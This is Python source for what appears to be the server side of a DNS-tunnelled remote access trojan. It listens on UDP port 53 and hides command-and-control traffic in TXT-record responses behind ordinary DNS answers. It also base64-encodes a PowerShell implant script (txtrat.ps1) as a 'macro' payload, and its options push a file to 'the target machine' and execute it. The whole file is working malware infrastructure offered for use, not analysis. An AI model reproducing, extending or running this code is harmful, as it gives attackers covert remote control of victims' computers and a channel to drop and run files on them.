import socket
import json
import threading
from optparse import OptionParser
from os import path
import base64

import request
import response
import settings
import command
import console


def main():

    settings.init()
    parser = OptionParser()

    # IP address
    parser.add_option(
        "-a",
        "--address",
        help = "IPv4 address to set as listener",
        action = "store",
        type = "string",
        dest = "address",
        default = '127.0.0.1'
    )

    # Send file
    parser.add_option(
        "-f",
        "--file",
        help = "Send a file to the target machine. Provide absolute path",
        action = "store",
        type = "string",
        dest = "file",
        default = ""
    )

    # Execute file
    parser.add_option(
        "-e",
        "--execute",
        help = "Execute file assigned to --file option. --file option must be set",
        action = "store_true",
        dest = "execute",
        default = False
    )

    (options, args) = parser.parse_args()

    sendFile = options.file
    execute = options.execute

    # setup manage.json if the file doesn't exist.  txtrat.ps1 is needed to fill macro key
    if not path.exists("./manage.json"):
        with settings.lock:
            manage = settings.initmanage

            with open('./txtrat.ps1', 'r') as f:
                data = f.read()

            manage["macro"] = base64.b64encode(data.encode("utf-16")).decode()

            with open('./manage.json', 'w') as f:
                json.dump(manage, f)

    x = threading.Thread(target=console.newConsole, args=())
    x.start()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((options.address, 53))

    while True:
        # recieve dns request
        data, addr = sock.recvfrom(512)

        # parse query and generate response body up to query
        dnsquerybody, records, rectype, cmddata = request.parseRequest(data)    # Argument is everyting received from dns request body
                                                                                # dnsquerybody: dns response up to query (ex: b'\x9c\xc2\x84\x00\x00\x01\x00\x01\x00\x00\x00\x00\x07koratxt\x03net\x00\x00\x10\x00\x01')
                                                                                # records: array or records to generate default response (ex: [{'name': '@', 'ttl': 400, 'value': 'Hello World!'}])
                                                                                # rectype: dns type that the record belongs to (ex: b'\x00\x10')
        
        if len(records) == 0:      # do not send a response if we dont have a record for it
            continue

        # generate answer section
        if len(cmddata) > 0 and rectype == b'\x00\x10':         # C2
            #print(cmddata)
            returndata = command.parsecommand(cmddata)
            if returndata == "":
                continue
            dnsanswerbody = response.genTxtResponse(records, returndata)
        else:                                                   # non C2
            dnsanswerbody = response.genResponse(records, rectype)


        # send response
        sock.sendto(dnsquerybody + dnsanswerbody, addr)



if __name__ == '__main__':
    main()